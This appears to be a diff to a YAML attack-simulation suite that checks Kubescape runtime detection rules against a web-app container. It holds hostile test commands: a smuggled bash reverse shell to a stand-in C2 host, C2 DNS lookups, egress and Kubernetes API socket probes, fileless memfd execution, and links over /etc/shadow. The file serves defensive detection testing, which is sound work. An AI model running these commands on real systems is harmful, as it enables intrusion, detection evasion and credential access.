@@ -448,11 +448,12 @@ attacks:
         ip: "127.0.0.1;bash -c 'bash -i >& /dev/tcp/c2.evil.example.com/4444 0>&1' 2>/dev/null || echo revshell_failed"
     successIndicators:
       - bodyContains: "revshell_failed"
-    expectedDetections:
-      - ruleID: R0001
-        ruleName: Unexpected process launched
-        containerName: mywebapp-app
-        command: bash
+    # /bin/bash IS in this image's learned baseline (it is how the entrypoint
+    # runs), so R0001 cannot fire on it — and bash's /dev/tcp is a BUILTIN, so no
+    # separate process is spawned to catch either. The kernel-observable tells of
+    # this chain are the DNS lookup and the egress attempt, which have their own
+    # dedicated attacks in the rule-family sweep below. Honest boundary.
+    expectedDetections: []
 
   # T1105 — Download and execute (wget + chmod + exec)
   # Standard dropper technique used by crypto miners and botnets.
@@ -580,3 +581,57 @@ attacks:
         ruleName: Unexpected process launched
         containerName: mywebapp-app
         command: cat
+
+  # ── Full rule-family sweep ───────────────────────────────────────────────────
+  # Brings this leg up to the same coverage as redis/argocd. Rule names are
+  # verbatim from kubescape/default-rules.yaml. bash and dash ARE in this image's
+  # learned baseline, so a bare `sh -c` is not anomalous — every assertion below
+  # pins the child binary (cat/ln/getent/perl), which is not.
+  - name: dns-anomaly-lookup
+    type: cmdinject
+    exec: { command: ["sh", "-c", "getent hosts scanner.evil-c2.example.com >/dev/null 2>&1 && echo dns_resolved || echo dns_attempted"] }
+    successIndicators: [{ responseContains: "dns_" }]
+    expectedDetections:
+      - { ruleID: R0005, ruleName: DNS Anomalies in container, containerName: mywebapp-app }
+  - name: k8s-api-unexpected-call
+    type: cmdinject
+    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect($s,sockaddr_in(443,inet_aton('10.43.0.1'))); close($s); print qq{k8s_api_probe_done}"] }
+    successIndicators: [{ responseContains: "k8s_api_probe_done" }]
+    expectedDetections:
+      - { ruleID: R0007, ruleName: Workload uses Kubernetes API unexpectedly, containerName: mywebapp-app }
+  - name: egress-external-c2
+    type: cmdinject
+    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect($s,sockaddr_in(80,inet_aton('1.1.1.1'))); close($s); print qq{egress_attempted}"] }
+    successIndicators: [{ responseContains: "egress_attempted" }]
+    expectedDetections:
+      - { ruleID: R0011, ruleName: Unexpected Egress Network Traffic, containerName: mywebapp-app }
+  - name: drifted-binary-exec
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cp /bin/ls /dev/shm/drifted_bob && printf '\\n#bob-drift' >> /dev/shm/drifted_bob && chmod +x /dev/shm/drifted_bob && /dev/shm/drifted_bob / >/dev/null 2>&1 && echo drift_exec_done; rm -f /dev/shm/drifted_bob"] }
+    successIndicators: [{ responseContains: "drift_exec_done" }]
+    expectedDetections:
+      - { ruleID: R1000, ruleName: Process executed from malicious source, containerName: mywebapp-app }
+  - name: exec-from-volume-mount
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cp /bin/echo /host/var/log/mnt_payload && chmod +x /host/var/log/mnt_payload && /host/var/log/mnt_payload mount_exec_done; rm -f /host/var/log/mnt_payload"] }
+    successIndicators: [{ responseContains: "mount_exec_done" }]
+    expectedDetections:
+      - { ruleID: R1004, ruleName: Process executed from mount, containerName: mywebapp-app }
+  - name: fileless-memfd-exec
+    type: fileless
+    exec: { command: ["perl", "-e", "my $n=\"bobfl\\0\"; my $fd=syscall(319,$n,0); die if $fd<0; open(my $m,'>&='.$fd) or die; open(my $s,'<','/bin/echo') or die; binmode $s; binmode $m; local $/; my $d=<$s>; print $m $d; exec(\"/proc/$$/fd/$fd\",\"memfd_exec_done\");"] }
+    successIndicators: [{ responseContains: "memfd_exec_done" }]
+    expectedDetections:
+      - { ruleID: R1005, ruleName: Fileless execution detected, containerName: mywebapp-app }
+  - name: symlink-shadow
+    type: cmdinject
+    exec: { command: ["ln", "-sf", "/etc/shadow", "/tmp/webapp_softlink_probe"] }
+    successIndicators: [{ responseContains: "" }]
+    expectedDetections:
+      - { ruleID: R1010, ruleName: Soft link created over sensitive file, containerName: mywebapp-app, command: ln }
+  - name: hardlink-shadow
+    type: cmdinject
+    exec: { command: ["sh", "-c", "ln /etc/shadow /tmp/webapp_hl >/dev/null 2>&1 && echo hardlink_done; rm -f /tmp/webapp_hl"] }
+    successIndicators: [{ responseContains: "hardlink_done" }]
+    expectedDetections:
+      - { ruleID: R1012, ruleName: Hard link created over sensitive file, containerName: mywebapp-app, command: ln }
